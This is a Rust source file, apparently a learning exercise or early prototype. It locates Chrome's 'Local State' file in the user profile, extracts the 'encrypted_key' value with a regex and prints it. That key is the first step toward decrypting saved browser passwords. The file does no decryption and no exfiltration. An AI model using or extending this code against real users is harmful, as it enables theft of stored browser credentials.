use std::path::PathBuf;
use std::{                          // imports from the standard library these modules:
    env,                            // used to access command line arguments
    error::Error,                   // used to handle errors
    fs::File,                       // used to open files
    io::{BufRead, BufReader},       // used to read files  
}; 
use regex::Regex;

fn get_chrome_local_pass_path() -> PathBuf{
    let userprofile = env::var("USERPROFILE").unwrap_or_else(|_| String::from("."));                                        // Get the USERPROFILE environment variable
    let local_pass_path = PathBuf::from(format!(r"{}\AppData\Local\Google\Chrome\User Data\Local State", userprofile));     // Construct the path
    return local_pass_path;
}

fn extract_encrypted_key(local_pass_path_file: File) -> Result<String, String> {
    let reader = BufReader::new(&local_pass_path_file);                            // create a buffer reader to read the file
    for line in reader.lines() {                                                   // iterate over each line in the file       
        let line = match line {
            Ok(line) => line,
            Err(err) => return Err(err.to_string()),                               // return error if there's an IO error
        };
        let re = match Regex::new(r#""encrypted_key":"([^"]+)""#) {                // Regex pattern for finding subustring after "encrypted_key"
            Ok(re) => re,
            Err(err) => return Err(err.to_string()),                               // return error if there's an error creating the regex
        };
        if let Some(captures) = re.captures(&line) {                               // find string where there is the Regex
            if let Some(encrypted_key) = captures.get(1) {
                return Ok(encrypted_key.as_str().to_string());                     // return the substring
            }
        } else {
            println!("Substring didn't find");                                     // print if substring is not found
        }
    }
    Err("Substring not found".to_string())                                         // return an error if substring is not found
}

fn main() -> Result<(), Box<dyn Error>> {
    let local_pass_path = get_chrome_local_pass_path();
    println!("Path: {:?}", local_pass_path);

    let local_pass_path_file = File::open(get_chrome_local_pass_path())?;               // open file from command line arguments            
    let encrypted_key = extract_encrypted_key(local_pass_path_file)
        .unwrap_or_default();  // Utilizza una stringa vuota se c'è un errore
    println!("Encrypted key: {}", encrypted_key);


    Ok(())
}
